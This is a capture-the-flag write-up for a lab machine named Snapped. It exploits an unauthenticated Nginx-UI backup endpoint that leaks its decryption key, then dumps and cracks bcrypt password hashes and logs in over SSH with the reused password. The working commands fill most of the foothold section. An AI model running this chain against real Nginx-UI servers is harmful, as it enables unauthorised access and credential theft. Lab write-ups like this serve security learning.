## Overview

Snapped is a Hard Linux machine that fronts a single interesting web service: **Nginx-UI**, a web management panel for nginx. Its foothold is **CVE-2026-27944** — the panel's `/api/backup` endpoint requires no authentication *and* discloses the decryption key/IV for the backup in the `X-Backup-Security` response header. That gives an anonymous attacker the application's own SQLite database, including bcrypt password hashes. One cracks, and the password is reused for SSH. This post goes from recon to a shell as `jonathan` and the user flag; privilege escalation is intentionally left out.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22   | OpenSSH 9.6p1 | Ubuntu 24.04 |
| 80   | nginx | redirects to the Nginx-UI panel on a vhost |

Only two ports. Port 80 serves the Nginx-UI login page on a virtual host (`admin.snapped.htb`), so add it to `/etc/hosts` (or send an explicit `Host:` header).

```bash
nmap -sC -sV 10.129.9.171
```

## Enumeration

The web service is **Nginx-UI 2.3.2**. Default credentials don't work, so the panel itself is a dead end for login — but the version is the tell. Nginx-UI ≤ 2.3.2 is vulnerable to **CVE-2026-27944**: the `/api/backup` endpoint is reachable with no authentication, and the response leaks the AES‑256‑CBC key and IV (base64 `key:iv`) in the `X-Backup-Security` header.


## Foothold

Pull the backup anonymously and capture the `X-Backup-Security` header:

```bash
curl -OJ -D - -H 'Host: admin.snapped.htb' http://10.129.9.171/api/backup
# X-Backup-Security: <b64key>:<b64iv>
```

The downloaded zip contains `hash_info.txt`, `nginx.zip`, and an encrypted `nginx-ui.zip`. Decode the header's key and IV to hex and decrypt the inner archive with OpenSSL:

```bash
key=$(echo '<b64key>' | base64 -d | xxd -p -c256)
iv=$(echo '<b64iv>' | base64 -d | xxd -p)
unzip -d backup backup-*.zip
openssl enc -aes-256-cbc -d -in backup/nginx-ui.zip -out dec.zip -K $key -iv $iv
unzip dec.zip   # -> app.ini, database.db
```

Inside `database.db` is the Nginx-UI `users` table with bcrypt hashes:

```bash
sqlite3 database.db 'select * from users;'
# admin | $2a$10$...
# jonathan | $2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq
```

Only jonathan's hash cracks against rockyou:

```bash
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --force
# $2a$10$8M7JZSRLKdt...:<redacted>
```

The recovered password is reused for SSH, landing a shell as `jonathan`:

```bash
sshpass -p '<redacted>' ssh -o StrictHostKeyChecking=no jonathan@10.129.9.171
```
